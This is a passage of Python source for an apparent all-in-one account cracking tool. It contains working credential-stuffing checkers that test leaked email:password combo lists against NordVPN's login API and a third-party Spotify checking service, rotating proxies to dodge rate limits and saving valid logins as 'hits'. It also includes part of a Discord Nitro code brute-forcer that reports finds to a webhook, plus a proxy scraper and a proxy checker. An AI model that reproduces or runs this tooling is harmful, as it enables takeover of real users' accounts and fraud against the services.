                with open("Nitro Codes.txt", "w") as file: # Open file to write
                    file.write(nitro) # Write the nitro code to the file it will automatically add a newline

                if notify is not None: # If a webhook has been added
                    DiscordWebhook( # Send the message to discord letting the user know there has been a valid nitro code
                        url = notify,
                        content = f"Valid Nito Code detected! @everyone \n{nitro}"
                    ).execute()

                return True # Tell the main function the code was found

            else: # If the responce got ignored or is invalid ( such as a 404 or 405 )
                print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n") # Tell the user it tested a code and it was invalid
                return False # Tell the main function there was not a code found

    if __name__ == '__main__':
        Gen = NitroGen() # Create the nitro generator object
        Gen.main() # Run the main code

def nordvpn():
    import requests
    import random
    import os
    from colorama import Fore, Style, init
    import tkinter as tk 
    from tkinter import filedialog
    import time
    import threading
    from sys import stdout

    init(convert=True)

    lock = threading.Lock()

    def free_print(arg):
        lock.acquire()
        stdout.flush()
        print(arg)
        lock.release()   

    class NordVPN:
        def __init__(self):
            self.data = {
                'use_proxy': False,
                'proxy_type': None,
                'proxy_dir': None,
                'combo_dir': None,
                'checked': 0,
                'retries': 0,
                'cpm': 0,
            }

            self.custom = ''
            root = tk.Tk()
            root.withdraw()


        def __read(self,filename, method):
            output = []
            with open(filename, method, encoding='UTF-8') as file:
                lines = file.readlines()
                for l in lines:
                    output.append(l.replace('\n', ''))

            return output

        def __make_copy(self):
            with open('data/temp_combo.txt', 'w', encoding='UTF-8') as file:
                accounts = self.__get_accounts()
                for x in accounts:
                    file.write(x + '\n')

        def __get_accounts(self):
            account_list = self.__read(self.data['combo_dir'], 'r')
            return account_list

        def __get_proxy(self, proxy_type, direct):
            proxy_list = self.__read(self.data['proxy_dir'], 'r') 
            proxies = {'http': '%s://%s' % (self.data['proxy_type'], random.choice(proxy_list))}
            
            return proxies

        def custom_message(self, arg):
            self.custom = arg 

        def cpm_counter(self):
            while True:
                previous = self.data['checked']
                time.sleep(4)
                after =self.data['checked']
                self.data['cpm'] = (after-previous) * 15

        def update_title(self):
            while True:
                elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
                os.system('title Fast NordVPN Checker - Checked: %s ^| Retries: %s ^| CPM: %s ^| Time Elapsed: %s ^| Threads: %s' % (self.data['checked'], self.data['retries'], self.data['cpm'], elapsed, (threading.active_count() - 2)))
                time.sleep(0.4)

        def title(self):
            print(f'''{Fore.CYAN}
        \t\t\t\t      ▐ ▄       ▄▄▄  ·▄▄▄▄       ▌ ▐· ▄▄▄· ▐ ▄ 
        \t\t\t\t     •█▌▐█▪     ▀▄ █·██▪ ██     ▪█·█▌▐█ ▄█•█▌▐█
        \t\t\t\t     ▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▐█▐█• ██▀·▐█▐▐▌
        \t\t\t\t     ██▐█▌▐█▌.▐▌▐█•█▌██. ██      ███ ▐█▪·•██▐█▌
        \t\t\t\t     ▀▀ █▪ ▀█▄▀▪.▀  ▀▀▀▀▀▀•     . ▀  .▀   ▀▀ █▪
        \t\t\t\t                                           
                {Style.RESET_ALL}''')


        def user_proxy(self):
            self.data['use_proxy'] = True

            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose choose proxy text file. ')

            proxy_dir = filedialog.askopenfilename()
            self.data['proxy_dir'] = proxy_dir

            try:
                proxy_type = int(input(f'[{Fore.CYAN}?{Style.RESET_ALL}] HTTPS[{Fore.CYAN}0{Style.RESET_ALL}]/SOCKS4[{Fore.CYAN}1{Style.RESET_ALL}]/SOCKS5[{Fore.CYAN}2{Style.RESET_ALL}] > '))
            
            except ValueError:
                print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
                time.sleep(3)            
                self.user_proxy()

            if proxy_type == 0:
                self.data['proxy_type'] = 'https'
                            
            elif proxy_type == 1:
                self.data['proxy_type'] = 'socks4'

            elif proxy_type== 2:
                self.data['proxy_type'] = 'socks5'

            else:
                print(f'[{Fore.CYAN}!{Style.RESET_ALL}] Please choose a valid int such as 0, 1, or 2!')
                time.sleep(3)
                self.user_proxy()

        def user_combo(self):
            combo_dir = filedialog.askopenfilename()
            self.data['combo_dir'] = combo_dir
            
            self.__make_copy()

        def get_accounts(self):
            account_list = self.__read('data/temp_combo.txt', 'r')
            return account_list

        def get_data(self):
            return self.data


        def checker(self, email, password):
            url = 'https://api.nordvpn.com/v1/users/tokens'
            data = {'username': email, 'password': password}

            if self.data['use_proxy']:
                proxies = self.__get_proxy(self.data['proxy_type'], self.data['proxy_dir'])

                try:

                    r = requests.post(url, json=data, proxies=proxies)

                    if 'Unauthorized' in r.text:
                        free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password}')
                        with open('output/bad.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))

                    if 'user_id' in r.text:
                        expiry = r.json()['expires_at']
                        free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
                        with open('output/raw_hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))
                        with open('output/hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s | Expiry Date: %s %s\n' %(email, password, expiry, self.custom))

                    if 'Too Many Requests' in r.text:
                        free_print(f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')

                    self.data['checked'] += 1
                except requests.exceptions.RequestException: #all requests related errors
                    self.data['retries'] += 1
                    self.checker(email, password)

            else:
                try:
                    r = requests.post(url, json=data)

                    if 'Unauthorized' in r.text:
                            free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password} ')
                            with open('output/bad.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))

                    if 'user_id' in r.text:
                        expiry = r.json()['expires_at']
                        free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
                        with open('output/raw_hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))
                        with open('output/hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s | Expiry Date: %s %s\n' %(email, password, expiry, self.custom))

                    if 'Too Many Requests' in r.text:
                        free_print(f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')

                    self.data['checked'] += 1
                except requests.exceptions.RequestException:
                    self.data['retries'] += 1
                    self.checker(email, password)


        def multi_threading(self):
            self.start = time.time()
            threading.Thread(target = self.cpm_counter, daemon=True).start()
            threading.Thread(target = self.update_title, daemon=True).start()

    check = None

    def worker(n, combos, thread_id):
        global check

        while check[thread_id] < len(combos):
            combination = combos[check[thread_id]].split(':')
            n.checker(combination[0], combination[1])
            check[thread_id] += 1 

    def main():
        global check
        os.system('cls')
        os.system('title Fast Nord VPN Checker ^ | //Fire')
        
        n = NordVPN()
        n.title()
        print('\n\n')

        use_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add custom message after hit? y/n  > ')

        if use_message == 'y':
            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] This message will be added to the text file if it is a hit.')
            custom_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add: ')
            n.custom_message(custom_message)

        use_proxy = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Use proxy? y/n > ')

        if use_proxy == 'y':
            n.user_proxy()

        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose combo list text file. (email:pass)')

        n.user_combo() #get file directory

        combos = n.get_accounts() #combo in list

        thread_count = int(input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Enter number of threads > '))

        n.multi_threading()

        os.system('cls')
        n.title()
        print('\n\n')

        threads = []

        check = [0 for i in range(thread_count)]

        for i in range(thread_count):
            sliced_combo = combos[int(len(combos) / thread_count * i): int(len(combos)/ thread_count* (i+1))]
            t = threading.Thread(target=worker, args= (n , sliced_combo, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print('[!] Task completed.')

        os.system('pause>nul')

    if __name__ =='__main__':
        main()

def proxycheck():
    import urllib.request , socket
    import tkinter
    from tkinter import filedialog
    a = input("Please select proxy type (socks4, socks5, http): ")
    root = tkinter.Tk()
    root.withdraw()
    socket.setdefaulttimeout(180)

    # read the list of proxy IPs in proxyList
    proxyList = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))

    def is_bad_proxy(pip):    
        try:        
            proxy_handler = urllib.request.ProxyHandler({a: pip})        
            opener = urllib.request.build_opener(proxy_handler)
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)        
            sock=urllib.request.urlopen('http://www.google.com')  # change the url address here
            #sock=urllib.urlopen(req)
        except urllib.error.HTTPError as e:        
            return e.code
        except Exception as detail:

            print( "ERROR:", detail)
            return 1
        return 0

    for item in proxyList:
        if is_bad_proxy(item):
            print (Fore.RED+"Bad Proxy", item)
            sleep(2)
        else:
            print (item, Fore.GREEN+"is working")


def proxy_scrapper():
    from Proxy_List_Scrapper import Scrapper, Proxy, ScrapperException

    scrapper = Scrapper(category="ALL", print_err_trace=False)

    data = scrapper.getProxies()
    path = input("Enter the path of the .txt file on which to write the proxies (Enter 'd' to create a 'Scrapped Proxy' file): ")
    if path != "d":
        f = open(path, "a")

    elif path == "d":
        f = open("ScrappedProxy.txt", "a")


        
    for item in data.proxies:
        proxy = '{}:{}\n'.format(item.ip, item.port)
        f.write(proxy)

    f.close()

    # Print the size of proxies scrapped
    print("Total Proxies")
    print(data.len)

    # Print the Category of proxy from which you scrapped
    print("Category of the Proxy")
    print(data.category)
    print("Closing in 10 seconds")
    sleep(10)
from threading import *
def spotify():
    import requests
    import requests as reqs
    
    from itertools import islice
    import sys, os
    import tkinter
    from tkinter import filedialog

    root = tkinter.Tk()
    root.withdraw()

    print("""
    _____             _   _  __          _____ _               _             
    / ____|           | | (_)/ _|        / ____| |             | |            
    | (___  _ __   ___ | |_ _| |_ _   _  | |    | |__   ___  ___| | _____ _ __ 
    \___ \| '_ \ / _ \| __| |  _| | | | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
    ____) | |_) | (_) | |_| | | | |_| | | |____| | | |  __/ (__|   <  __/ |   
    |_____/| .__/ \___/ \__|_|_|  \__, |  \_____|_| |_|\___|\___|_|\_\___|_|   
            | |                     __/ |                                       
            |_|                    |___/                                        
                                                
    """)

    check = input("This is BETA Version. If tools misbehave please report it to the devs. \n Do you want to continue (yes/no | Default:yes): ")

    if check in ['n', 'N', 'No', 'no', 'NO']:
        sys.exit()

    account = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if not os.path.exists(account):
        sys.exit(f"[!] File '{account}' is does't exists!.")
    elif os.path.getsize(account) == 0:
        sys.exit(f"[!] File '{account}' is empty!.")

    premiumac = open("PremiumAccounts.txt", 'w')
    freeac = open("FreeAccounts.txt", 'w')

    Pno = 0
    Fno = 0
    Dno = 0
    tryno = 0

    url = "https://checkz.net/tools/ajax.php"

    loaded = len(open(account).readlines())
    print ("\n", loaded, " Accounts loaded for checking.......!")

    print ("\nStatus	|	Country	|	Expire Date	|	Username:Password\n")


    def result(country, userpass, response):
        global Pno, Fno, Dno, tryno
        if 'Premium' in (response.text):
            Pac = "|Premium account| Country:" + country + " | " + userpass
            premiumac.write(Pac)
            # print response.text
            tryno = tryno + 1
            Pno = Pno + 1
            print ("|", tryno, " Accounts Checked ..! | Premium:", Pno, " | Free: ", Fno, " | Dead: ", Dno)
            print (Pac)
        elif 'Free' in (response.text):
            Fac = "|Free account | Country:" + country + " Exp: Null| " + userpass
            freeac.write(Fac)
            tryno = tryno + 1
            Fno = Fno + 1
            print ("|", tryno, " Accounts Checked ..! | Premium:", Pno, " | Free: ", Fno, " | Dead: ", Dno)
            print (Fac)
        else:
            tryno = tryno + 1
            Dno = Dno + 1
            print ("|", tryno, " Accounts Checked ..! | Premium:", Pno, " | Free: ", Fno, " | Dead: ", Dno)
            print ("Dead account | Country: Null | Exp: Null | " + userpass)


    def checker(userpass):
        form = {
            'checker': 'spotify',
            'mplist': str(userpass),
            'proxylist': '127.0.0.1:80'
        }

        response = reqs.post(url, form, stream=True)
        # print response.text
        country = ((response.text).split("Cntry:", 1)[-1]).split("<\/td><td>", 1)[0]
        result(country, userpass, response)


    class checker1(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 0, loaded, 8):
                    checker(lines)


    class checker2(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 1, loaded, 8):
                    checker(lines)


    class checker3(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 2, loaded, 8):
                    checker(lines)


    class checker4(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 3, loaded, 8):
                    checker(lines)


    class checker5(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 4, loaded, 8):
                    checker(lines)


    class checker6(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 5, loaded, 8):
                    checker(lines)


    class checker7(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 6, loaded, 8):
                    checker(lines)


    class checker8(Thread):
        def run(self):
            with open(account) as lines:
                for lines in islice(lines, 7, loaded, 8):
                    checker(lines)


    # plz Do not increase the number of checker it may cause server down

    workers = [checker1(), checker2(), checker3(), checker4(), checker5(), checker6(), checker7(), checker8()]
    for worker in workers:
        worker.start()
    for worker in workers:
        worker.join()

    print ("\nTotal Checked account = ", tryno)
    print ("\nPremium Accounts List Saved at : PremiumAccounts.txt \nFree Accounts List Saved at : FreeAccounts.txt")
    print ("\nSend your feed/report issue to @//Fire")


if a == "1":
    slow_type(Fore.GREEN+"Loading checker xFire MC Checker will be added soon credits to OxygenX Checker By ShadowOxygenx I have made some edits in it so it can be more fast")
    a = input(Fore.YELLOW+"Please enter the path where your xFire AIO is downloaded: ")
    dd = f"{a}\OxygenX-0.8.exe"
    sleep(2)
    try:
        os.startfile(dd)
    except:
        print(Fore.RED+"Make Sure you entered right path")
        sleep(5)
    
elif a == "2":
    netflix()

elif a == "3":
    spotify()

elif a == "4":
    proxy_scrapper()

elif a == "5":
    nordvpn()

elif a == "6":
    nitro()

elif a == "7":
    combo_editor()

elif a == "8":
    proxycheck()





























